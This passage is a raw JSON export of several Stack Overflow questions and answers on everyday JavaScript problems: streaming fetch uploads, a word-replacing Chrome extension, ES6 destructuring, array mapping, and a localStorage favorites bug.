<a href=\"https://stackoverflow.com/questions/40939857/fetch-with-readablestream-as-request-body\" title=\"fetch with readablestream as request body\">stackoverflow.com/questions/40939857/&hellip;</a> and <a href=\"https://github.com/whatwg/fetch/pull/425\" rel=\"nofollow noreferrer\">github.com/whatwg/fetch/pull/425</a>. So the Fetch spec provides a way to do this (create a request from a Request made from a ReadableStream), but unfortunately, I don\u2019t think any browsers have shipped it yet."}], "owner": {"reputation": 723, "user_id": 5735184, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/H4nIV.png?s=128&g=1", "display_name": "Priansh Shah", "link": "https://stackoverflow.com/users/5735184/priansh-shah"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 331, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558554975, "creation_date": 1558554975, "question_id": 56264083, "link": "https://stackoverflow.com/questions/56264083/js-fetch-use-chunked-transfer-encoding-translating-curl-to-fetch", "title": "JS Fetch use Chunked Transfer Encoding (translating curl to Fetch)", "body": "<p>I'm trying to convert this curl command from the Kaldi docs:</p>\n\n<pre><code>curl -v -T test/data/english_test.raw -H \"Content-Type: audio/x-raw-int; rate=16000\" --header \"Transfer-Encoding: chunked\" --limit-rate 32000  \"http://localhost:8888/client/dynamic/recognize\"\n</code></pre>\n\n<p>To JS code, specifically fetch. I'm able to POST a binary file using fetch pretty easily but specifically what I need to do is use chunked transfer encoding. To the life of me I can't find any docs on this, and as far as I know in JS, it's really up to the user agent to set the transfer encoding. Would appreciate any pointers!</p>\n"}, {"tags": ["javascript", "google-chrome", "google-chrome-extension"], "comments": [{"owner": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558555216, "post_id": 56264074, "comment_id": 99144637, "body": "could the unreachable content be in iframes?"}, {"owner": {"reputation": 1313, "user_id": 8167494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tE1Ek.jpg?s=128&g=1", "display_name": "Isaac Vidrine", "link": "https://stackoverflow.com/users/8167494/isaac-vidrine"}, "edited": false, "score": 1, "creation_date": 1558555500, "post_id": 56264074, "comment_id": 99144780, "body": "means <code>parentNode</code> doesn&#39;t exist on the <code>node</code> object... just do a check and say <code>if(node.parentNode)</code>"}, {"owner": {"reputation": 966, "user_id": 3535760, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/FQ2Hn.jpg?s=128&g=1", "display_name": "viz", "link": "https://stackoverflow.com/users/3535760/viz"}, "edited": false, "score": 1, "creation_date": 1558555546, "post_id": 56264074, "comment_id": 99144796, "body": "I think you can debug what node has its parentNode as null. <code>if(!node.parentNode) debugger;</code>"}, {"owner": {"reputation": 662, "user_id": 5127598, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JKZw3.jpg?s=128&g=1", "display_name": "valegians", "link": "https://stackoverflow.com/users/5127598/valegians"}, "reply_to_user": {"reputation": 1313, "user_id": 8167494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tE1Ek.jpg?s=128&g=1", "display_name": "Isaac Vidrine", "link": "https://stackoverflow.com/users/8167494/isaac-vidrine"}, "edited": false, "score": 0, "creation_date": 1558555842, "post_id": 56264074, "comment_id": 99144914, "body": "@IsaacVidrine yep, well spotted. How silly of me!"}, {"owner": {"reputation": 24888, "user_id": 1023618, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5dd1a5bb0139abc749b7d4cd8cf7aa1b?s=128&d=identicon&r=PG", "display_name": "Reinstate Monica Cellio", "link": "https://stackoverflow.com/users/1023618/reinstate-monica-cellio"}, "edited": false, "score": 0, "creation_date": 1558556355, "post_id": 56264074, "comment_id": 99145150, "body": "The for loop is wrong. You set i to 0, node to a nodelist item, and then i++."}, {"owner": {"reputation": 1313, "user_id": 8167494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tE1Ek.jpg?s=128&g=1", "display_name": "Isaac Vidrine", "link": "https://stackoverflow.com/users/8167494/isaac-vidrine"}, "reply_to_user": {"reputation": 24888, "user_id": 1023618, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5dd1a5bb0139abc749b7d4cd8cf7aa1b?s=128&d=identicon&r=PG", "display_name": "Reinstate Monica Cellio", "link": "https://stackoverflow.com/users/1023618/reinstate-monica-cellio"}, "edited": false, "score": 1, "creation_date": 1558556856, "post_id": 56264074, "comment_id": 99145410, "body": "@Archer nothing is wrong with the for loop, test it yourself."}, {"owner": {"reputation": 24888, "user_id": 1023618, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5dd1a5bb0139abc749b7d4cd8cf7aa1b?s=128&d=identicon&r=PG", "display_name": "Reinstate Monica Cellio", "link": "https://stackoverflow.com/users/1023618/reinstate-monica-cellio"}, "reply_to_user": {"reputation": 1313, "user_id": 8167494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tE1Ek.jpg?s=128&g=1", "display_name": "Isaac Vidrine", "link": "https://stackoverflow.com/users/8167494/isaac-vidrine"}, "edited": false, "score": 0, "creation_date": 1558556954, "post_id": 56264074, "comment_id": 99145450, "body": "@IsaacVidrine so when does it stop?"}, {"owner": {"reputation": 1313, "user_id": 8167494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tE1Ek.jpg?s=128&g=1", "display_name": "Isaac Vidrine", "link": "https://stackoverflow.com/users/8167494/isaac-vidrine"}, "reply_to_user": {"reputation": 24888, "user_id": 1023618, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5dd1a5bb0139abc749b7d4cd8cf7aa1b?s=128&d=identicon&r=PG", "display_name": "Reinstate Monica Cellio", "link": "https://stackoverflow.com/users/1023618/reinstate-monica-cellio"}, "edited": false, "score": 0, "creation_date": 1558557140, "post_id": 56264074, "comment_id": 99145526, "body": "@Archer Im guessing its when <code>nodes[i]</code> is undefined... I tested in browser though and it works just like you were saying <code>i &lt; nodes.length</code>"}, {"owner": {"reputation": 662, "user_id": 5127598, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JKZw3.jpg?s=128&g=1", "display_name": "valegians", "link": "https://stackoverflow.com/users/5127598/valegians"}, "edited": false, "score": 0, "creation_date": 1558557925, "post_id": 56264074, "comment_id": 99145859, "body": "Yes, if the argument is <code>null</code> or <code>undefined</code> then it counts as being <code>false</code> so the loop ends."}, {"owner": {"reputation": 24888, "user_id": 1023618, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5dd1a5bb0139abc749b7d4cd8cf7aa1b?s=128&d=identicon&r=PG", "display_name": "Reinstate Monica Cellio", "link": "https://stackoverflow.com/users/1023618/reinstate-monica-cellio"}, "reply_to_user": {"reputation": 1313, "user_id": 8167494, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tE1Ek.jpg?s=128&g=1", "display_name": "Isaac Vidrine", "link": "https://stackoverflow.com/users/8167494/isaac-vidrine"}, "edited": false, "score": 0, "creation_date": 1558618932, "post_id": 56264074, "comment_id": 99167502, "body": "@IsaacVidrine Of course it does - that makes perfect sense now I think about it.  Thanks for teaching me a new thing for the day :)"}], "answers": [{"tags": [], "owner": {"reputation": 662, "user_id": 5127598, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JKZw3.jpg?s=128&g=1", "display_name": "valegians", "link": "https://stackoverflow.com/users/5127598/valegians"}, "is_accepted": true, "score": 0, "last_activity_date": 1558558219, "creation_date": 1558558219, "answer_id": 56264832, "question_id": 56264074, "link": "https://stackoverflow.com/questions/56264074/cannot-read-property-innerhtml-of-null-on-wikipedia-pages/56264832#56264832", "title": "Cannot read property &#39;innerHTML&#39; of null on Wikipedia pages", "body": "<p>As pointed out by @IsaacVidrine in the comments to the question the error is caused by <code>node</code> not having <code>parentNode</code>. To fix it check for existence of <code>parentNode</code> in the for loop like this:</p>\n\n<pre><code>for(var i = 0; node=nodes[i] ; i++) {\n        if(node.parentNode){\n            node.parentNode.innerHTML = node.parentNode.innerHTML.replace(regex, function(match) {\n                return wordMap[match];\n            });\n        }\n    }\n</code></pre>\n"}], "owner": {"reputation": 662, "user_id": 5127598, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JKZw3.jpg?s=128&g=1", "display_name": "valegians", "link": "https://stackoverflow.com/users/5127598/valegians"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "accepted_answer_id": 56264832, "answer_count": 1, "score": 1, "last_activity_date": 1558558219, "creation_date": 1558554902, "question_id": 56264074, "link": "https://stackoverflow.com/questions/56264074/cannot-read-property-innerhtml-of-null-on-wikipedia-pages", "title": "Cannot read property &#39;innerHTML&#39; of null on Wikipedia pages", "body": "<p><em>I am not a JS developper so forgive any horrible code I might have written</em></p>\n\n<p>Hi all,</p>\n\n<p>I am working on this chrome extension project, and I am running into a really weird error. The extension is meant to go through a webpage and replace certain words. It seems to work fine on all websites I've tried except for wikipedia. On wikipedia only the words in the first paragraph of the page get replaced and then I get an <code>Uncaught TypeError: Cannot read property 'innerHTML' of null</code> error thrown.</p>\n\n<p><strong>Content.js</strong></p>\n\n<pre><code>var nodes = [];\nvar wordMap = {'color':'colour'}\nvar regex = new RegExp(Object.keys(wordMap).join(\"|\"),\"gi\");\n\nif( document.readyState !== 'loading' ) {\n    console.log( 'document is already ready, just execute code here' );\n    myInitCode();\n} else {\n    document.addEventListener('DOMContentLoaded', function () {\n        console.log( 'document was not ready, place code here' );\n        myInitCode();\n    });\n}\n\nfunction myInitCode() {\n    var walker = document.createTreeWalker(\n    document.body,\n    NodeFilter.SHOW_TEXT,\n    function(node) {\n        var matches = node.textContent.match(regex);\n\n        if(matches) { \n            return NodeFilter.FILTER_ACCEPT;\n        } else {\n            return NodeFilter.FILTER_SKIP;\n        }\n    },\n    false);\n\n    while(walker.nextNode()) {\n        nodes.push(walker.currentNode);\n    }\n\n    for(var i = 0; node=nodes[i] ; i++) {\n        node.parentNode.innerHTML = node.parentNode.innerHTML.replace(regex, function(match) {\n            return wordMap[match];\n        });\n    }\n}\n</code></pre>\n\n<p><strong>Manifest.json content script section</strong></p>\n\n<pre><code>\"content_scripts\": [\n    {\n        \"matches\": [\n            \"*://*/*\"\n        ],\n        \"js\": [\n            \"content.js\"\n        ],\n        \"run_at\": \"document_end\" \n    }\n]\n</code></pre>\n\n<p>Here is a screenshot of the error occurring:\n<a href=\"https://i.stack.imgur.com/10v9z.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/10v9z.jpg\" alt=\"enter image description here\"></a> </p>\n\n<p>And here is a screenshot of the error:\n<a href=\"https://i.stack.imgur.com/yEWSu.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/yEWSu.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>I tried to look around for answers, and I thought the error was happening because the DOM hadn't loaded yet so I added code to address that but the error still happens.\nAny ideas as to why this might be happening?</p>\n\n<p>Thank you!</p>\n"}, {"tags": ["javascript", "ecmascript-6", "destructuring"], "comments": [{"owner": {"reputation": 28101, "user_id": 3082296, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5eac8c095f63cb9fe29a9af3cb97eb0e?s=128&d=identicon&r=PG&f=1", "display_name": "adiga", "link": "https://stackoverflow.com/users/3082296/adiga"}, "edited": false, "score": 2, "creation_date": 1558554987, "post_id": 56264068, "comment_id": 99144537, "body": "Destructure the object inside the function: <code>const f1 = p =&gt; {  const { a, b } = p; ... }</code>"}, {"owner": {"reputation": 553, "user_id": 214024, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2cfc278724e006d857e268b409cc4d54?s=128&d=identicon&r=PG", "display_name": "Nan Li", "link": "https://stackoverflow.com/users/214024/nan-li"}, "reply_to_user": {"reputation": 28101, "user_id": 3082296, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5eac8c095f63cb9fe29a9af3cb97eb0e?s=128&d=identicon&r=PG&f=1", "display_name": "adiga", "link": "https://stackoverflow.com/users/3082296/adiga"}, "edited": false, "score": 0, "creation_date": 1558555375, "post_id": 56264068, "comment_id": 99144723, "body": "that&#39;s not the sulotion. it kind of defeats the purpose of destructing function parameters, it will introduce statements in your function, make it less &quot;functional&quot;"}, {"owner": {"reputation": 15524, "user_id": 10366495, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pRi10.png?s=128&g=1", "display_name": "Shidersz", "link": "https://stackoverflow.com/users/10366495/shidersz"}, "edited": false, "score": 1, "creation_date": 1558555387, "post_id": 56264068, "comment_id": 99144728, "body": "Another alternative could be <code>const f1 = (p, {a, b} = p ) =&gt; ...</code> but this won&#39;t work if you expect to call your function with more than one parameter."}, {"owner": {"reputation": 28101, "user_id": 3082296, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5eac8c095f63cb9fe29a9af3cb97eb0e?s=128&d=identicon&r=PG&f=1", "display_name": "adiga", "link": "https://stackoverflow.com/users/3082296/adiga"}, "edited": false, "score": 0, "creation_date": 1558555926, "post_id": 56264068, "comment_id": 99144958, "body": "This is exactly the purpose of destructuring a parameter. You do it only when you care about some of the properties and not the full object."}, {"owner": {"reputation": 553, "user_id": 214024, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2cfc278724e006d857e268b409cc4d54?s=128&d=identicon&r=PG", "display_name": "Nan Li", "link": "https://stackoverflow.com/users/214024/nan-li"}, "reply_to_user": {"reputation": 15524, "user_id": 10366495, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pRi10.png?s=128&g=1", "display_name": "Shidersz", "link": "https://stackoverflow.com/users/10366495/shidersz"}, "edited": false, "score": 0, "creation_date": 1558555953, "post_id": 56264068, "comment_id": 99144969, "body": "@Shidersz, that works! and it&#39;s good enough for me, I tend to make all my functions take just 1 object parameter with everything inside. but I don&#39;t even recognize the syntax, looks like f1 expects 2 parameters. is there a name for this syntax?"}, {"owner": {"reputation": 15524, "user_id": 10366495, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pRi10.png?s=128&g=1", "display_name": "Shidersz", "link": "https://stackoverflow.com/users/10366495/shidersz"}, "edited": false, "score": 0, "creation_date": 1558555954, "post_id": 56264068, "comment_id": 99144970, "body": "And another one could be: <code>const f1 = ({ a, b, ...p }) =&gt; ((a, b, p) =&gt; {console.log(a, b, p)})(a, b, p = {a, b, ...p})</code>"}, {"owner": {"reputation": 28101, "user_id": 3082296, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5eac8c095f63cb9fe29a9af3cb97eb0e?s=128&d=identicon&r=PG&f=1", "display_name": "adiga", "link": "https://stackoverflow.com/users/3082296/adiga"}, "reply_to_user": {"reputation": 15524, "user_id": 10366495, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pRi10.png?s=128&g=1", "display_name": "Shidersz", "link": "https://stackoverflow.com/users/10366495/shidersz"}, "edited": false, "score": 0, "creation_date": 1558555985, "post_id": 56264068, "comment_id": 99144989, "body": "This has been asked multiple times and it&#39;s the same solution. Some of them have alternatives like the one @Shidersz suggested <a href=\"https://stackoverflow.com/questions/45145876\">1</a>,  <a href=\"https://stackoverflow.com/questions/40569983\">2</a>,  <a href=\"https://stackoverflow.com/questions/49075043\">3</a>, <a href=\"https://stackoverflow.com/questions/54085341\">4</a>"}, {"owner": {"reputation": 553, "user_id": 214024, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2cfc278724e006d857e268b409cc4d54?s=128&d=identicon&r=PG", "display_name": "Nan Li", "link": "https://stackoverflow.com/users/214024/nan-li"}, "reply_to_user": {"reputation": 28101, "user_id": 3082296, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/5eac8c095f63cb9fe29a9af3cb97eb0e?s=128&d=identicon&r=PG&f=1", "display_name": "adiga", "link": "https://stackoverflow.com/users/3082296/adiga"}, "edited": false, "score": 0, "creation_date": 1558556404, "post_id": 56264068, "comment_id": 99145172, "body": "@adiga, there is a difference between destructuring an object in a statement and destructuring function parameters. the latter will allow you to avoid statements and the curly braces in the function, resulting in more functional code. and the latter is what I&#39;m asking here"}, {"owner": {"reputation": 553, "user_id": 214024, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2cfc278724e006d857e268b409cc4d54?s=128&d=identicon&r=PG", "display_name": "Nan Li", "link": "https://stackoverflow.com/users/214024/nan-li"}, "reply_to_user": {"reputation": 15524, "user_id": 10366495, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/pRi10.png?s=128&g=1", "display_name": "Shidersz", "link": "https://stackoverflow.com/users/10366495/shidersz"}, "edited": false, "score": 0, "creation_date": 1558561712, "post_id": 56264068, "comment_id": 99147198, "body": "@Shidersz, got it, it&#39;s just a hack. basically moving the destruction statement from the function body to the function parameter"}], "owner": {"reputation": 553, "user_id": 214024, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2cfc278724e006d857e268b409cc4d54?s=128&d=identicon&r=PG", "display_name": "Nan Li", "link": "https://stackoverflow.com/users/214024/nan-li"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 33, "favorite_count": 1, "closed_date": 1558555136, "answer_count": 0, "score": 2, "last_activity_date": 1558554884, "creation_date": 1558554884, "question_id": 56264068, "link": "https://stackoverflow.com/questions/56264068/with-es6-syntax-how-to-capture-the-entire-arguments-while-destructing-function", "closed_reason": "Duplicate", "title": "with ES6 syntax, how to capture the entire arguments while destructing function parameters?", "body": "<p>I know I can capture the rest of the parameters while destructing function parameters:</p>\n\n<pre><code>const f1 = ({ a, b, ...p }) =&gt; ...\n\nf1({ a: 1, b: 2, c: 3, d: 4 })\n</code></pre>\n\n<p>then p contains c and d, but not a or b.</p>\n\n<p>Is there a syntax that makes p contain all of a, b, c and d while at the same time, destructing a and b?</p>\n\n<p>This is useful if inside f1 I need to call f2 with all the parameters.</p>\n"}, {"tags": ["javascript", "methods"], "comments": [{"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 1, "creation_date": 1558555014, "post_id": 56264050, "comment_id": 99144551, "body": "<code>incremented</code> exits only inside of the function. Perhaps you should <code>return</code> it?"}], "answers": [{"comments": [{"owner": {"reputation": 83, "user_id": 11499352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01f531f4c0ac6715713ee3a241e1715?s=128&d=identicon&r=PG&f=1", "display_name": "JL91", "link": "https://stackoverflow.com/users/11499352/jl91"}, "edited": false, "score": 0, "creation_date": 1558555201, "post_id": 56264095, "comment_id": 99144626, "body": "Thanks Jay, how would you edit this solution if you are also trying to ensure the same list is returned if no increment is provided?"}, {"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "edited": false, "score": 1, "creation_date": 1558555318, "post_id": 56264095, "comment_id": 99144691, "body": "just change <code>num + increment</code> to <code>num + (increment||0)</code>"}, {"owner": {"reputation": 83, "user_id": 11499352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01f531f4c0ac6715713ee3a241e1715?s=128&d=identicon&r=PG&f=1", "display_name": "JL91", "link": "https://stackoverflow.com/users/11499352/jl91"}, "edited": false, "score": 0, "creation_date": 1558555441, "post_id": 56264095, "comment_id": 99144752, "body": "Unfortunately that will return [0, 0] if I am trying to simply return a given list [1, 2] as [1, 2].. thanks!!"}, {"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "edited": false, "score": 1, "creation_date": 1558555475, "post_id": 56264095, "comment_id": 99144769, "body": "Sorry missed brackets, added now"}, {"owner": {"reputation": 901, "user_id": 2022103, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fG1JN.jpg?s=128&g=1", "display_name": "JayB", "link": "https://stackoverflow.com/users/2022103/jayb"}, "reply_to_user": {"reputation": 83, "user_id": 11499352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01f531f4c0ac6715713ee3a241e1715?s=128&d=identicon&r=PG&f=1", "display_name": "JL91", "link": "https://stackoverflow.com/users/11499352/jl91"}, "edited": false, "score": 1, "creation_date": 1558556664, "post_id": 56264095, "comment_id": 99145312, "body": "@JL91 I would change it to this:  <code>const incrementNums = (list, increment = 0) =&gt; list.map(num =&gt; num + increment);</code>"}], "tags": [], "owner": {"reputation": 901, "user_id": 2022103, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fG1JN.jpg?s=128&g=1", "display_name": "JayB", "link": "https://stackoverflow.com/users/2022103/jayb"}, "is_accepted": false, "score": 3, "last_activity_date": 1558555014, "creation_date": 1558555014, "answer_id": 56264095, "question_id": 56264050, "link": "https://stackoverflow.com/questions/56264050/self-learning-and-trying-to-return-an-array-with-every-number-incremented-by-a-p/56264095#56264095", "title": "Self-Learning and trying to return an array with every number incremented by a provided increment", "body": "<p>You aren't returning anything from that function. Try this:</p>\n\n<pre><code>const incrementNums = (list, increment) =&gt; {\n  return list.map(num =&gt; num + increment);\n};\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 83, "user_id": 11499352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01f531f4c0ac6715713ee3a241e1715?s=128&d=identicon&r=PG&f=1", "display_name": "JL91", "link": "https://stackoverflow.com/users/11499352/jl91"}, "edited": false, "score": 0, "creation_date": 1558555305, "post_id": 56264103, "comment_id": 99144682, "body": "Thanks John, how would you edit this solution if you are also trying to ensure the same list is returned if no increment is provided?"}, {"owner": {"reputation": 4237, "user_id": 10787900, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-4Z6j7Qhowx8/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-ighhCw1JxvK6l7ZVG0ZYElO2DSUA/mo/photo.jpg?sz=128", "display_name": "Bibberty", "link": "https://stackoverflow.com/users/10787900/bibberty"}, "edited": false, "score": 2, "creation_date": 1558555495, "post_id": 56264103, "comment_id": 99144776, "body": "Added support and test for undefined increment"}], "tags": [], "owner": {"reputation": 424, "user_id": 10948109, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/19d19f5f87e579185ea403eca2e586bf?s=128&d=identicon&r=PG&f=1", "display_name": "JohnSnow", "link": "https://stackoverflow.com/users/10948109/johnsnow"}, "is_accepted": false, "score": 1, "last_activity_date": 1558555723, "last_edit_date": 1558555723, "creation_date": 1558555056, "answer_id": 56264103, "question_id": 56264050, "link": "https://stackoverflow.com/questions/56264050/self-learning-and-trying-to-return-an-array-with-every-number-incremented-by-a-p/56264103#56264103", "title": "Self-Learning and trying to return an array with every number incremented by a provided increment", "body": "<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const list = [4, 5, 57, 84]\r\nconsole.log(list)\r\n\r\nconst incrementNums = (list, incrementer) =&gt; list.map(num =&gt; num + (incrementer||0));\r\n\r\nconsole.log(incrementNums(list, 10));\r\nconsole.log(incrementNums(list));</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 83, "user_id": 11499352, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f01f531f4c0ac6715713ee3a241e1715?s=128&d=identicon&r=PG&f=1", "display_name": "JL91", "link": "https://stackoverflow.com/users/11499352/jl91"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 33, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1558555723, "creation_date": 1558554787, "question_id": 56264050, "link": "https://stackoverflow.com/questions/56264050/self-learning-and-trying-to-return-an-array-with-every-number-incremented-by-a-p", "title": "Self-Learning and trying to return an array with every number incremented by a provided increment", "body": "<p>Learning to code at the moment and I'm struggling to take an array of numbers and return an array with all of the numbers incremented by a provided increment. Ideally using map.. </p>\n\n<p>I have already tried this and I know its neither working nor pretty...</p>\n\n<pre><code>const incrementNums = (list, increment) =&gt; {\n  let incremented = list.map(num =&gt; {return num + increment})\n};\n</code></pre>\n\n<p>For example... </p>\n\n<pre><code>  const list = [4];\n  const actual = incrementNums(list, 1);\n  const expected = [5];\n</code></pre>\n\n<p>Or...</p>\n\n<pre><code>  list = [4, 5, 57, 84];\n  actual = incrementNums(list, 1);\n  expected = [5, 6, 58, 85];\n  expect(actual).to.eql(expected);\n\n  actual = incrementNums(list, 10);\n  expected = [14, 15, 67, 94];\n</code></pre>\n"}, {"tags": ["javascript", "jquery", "local-storage"], "comments": [{"owner": {"reputation": 11071, "user_id": 358435, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6a07b64e50a331ba65e6d5b9b410199?s=128&d=identicon&r=PG&f=1", "display_name": "karthick", "link": "https://stackoverflow.com/users/358435/karthick"}, "edited": false, "score": 0, "creation_date": 1558556250, "post_id": 56264048, "comment_id": 99145097, "body": "where are you adding it?"}, {"owner": {"reputation": 87, "user_id": 1974231, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5f882a3524f6eee40eafff3cfbba10aa?s=128&d=identicon&r=PG", "display_name": "tone4407", "link": "https://stackoverflow.com/users/1974231/tone4407"}, "reply_to_user": {"reputation": 11071, "user_id": 358435, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6a07b64e50a331ba65e6d5b9b410199?s=128&d=identicon&r=PG&f=1", "display_name": "karthick", "link": "https://stackoverflow.com/users/358435/karthick"}, "edited": false, "score": 0, "creation_date": 1558558194, "post_id": 56264048, "comment_id": 99145959, "body": "I&#39;m adding it on the individual product pages. I&#39;ve udated my question above with that code."}], "answers": [{"tags": [], "owner": {"reputation": 41497, "user_id": 661872, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/yqbSi.png?s=128&g=1", "display_name": "Lawrence Cherone", "link": "https://stackoverflow.com/users/661872/lawrence-cherone"}, "is_accepted": false, "score": 1, "last_activity_date": 1558556705, "creation_date": 1558556705, "answer_id": 56264495, "question_id": 56264048, "link": "https://stackoverflow.com/questions/56264048/local-storage-is-adding-a-null-object-into-my-array/56264495#56264495", "title": "Local storage is adding a null object into my array", "body": "<p>Dont use <code>delete</code>, it will replace it with <code>null/undefined</code></p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var favs = [{}]\r\n\r\ndelete favs[0]\r\n\r\nconsole.log(favs)</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>Use splice</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>var favs = [{}]\r\n\r\nfavs.splice(0, 1)\r\n\r\nconsole.log(favs)</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 87, "user_id": 1974231, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/5f882a3524f6eee40eafff3cfbba10aa?s=128&d=identicon&r=PG", "display_name": "tone4407", "link": "https://stackoverflow.com/users/1974231/tone4407"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 156, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558558367, "creation_date": 1558554785, "last_edit_date": 1558558367, "question_id": 56264048, "link": "https://stackoverflow.com/questions/56264048/local-storage-is-adding-a-null-object-into-my-array", "title": "Local storage is adding a null object into my array", "body": "<p>I've created an 'add to favorites' functionality using local storage. When I add products from a product page they are added, stored, and displaying properly when I initially navigate to my favorites page. However, if I navigate back and forth within the browser or type in the favorites page URL directly, I'm receiving this error:</p>\n\n<p>Uncaught TypeError: Cannot read property 'id' of null</p>\n\n<p>The line with the error is: id = item.id;</p>\n\n<p>When investing the error I noticed that a null object has now been added to my array. I'm not sure why this null object is being added.</p>\n\n<p>Here is the code for an individual product page where I'm adding it:</p>\n\n<pre><code>var debug = true; // Set to true to output message to the error console\n$(document).ready(function() {\n  var favs = favInit();\n  var item = {\n    id:   '{{ dynamic_page_hubdb_row.hs_id }}',\n    name: '{{ dynamic_page_hubdb_row.hs_name }}',\n    url:  '{{ dynamic_page_hubdb_row.image.url }}',\n    path: '{{ request.path }}'\n  }\n  var isFav = isFavorite(item,favs);\n  if (isFav){\n    setAsFavorite();\n    $('#addFavorite').hide();\n    $('#addFavoriteStar').hide();\n    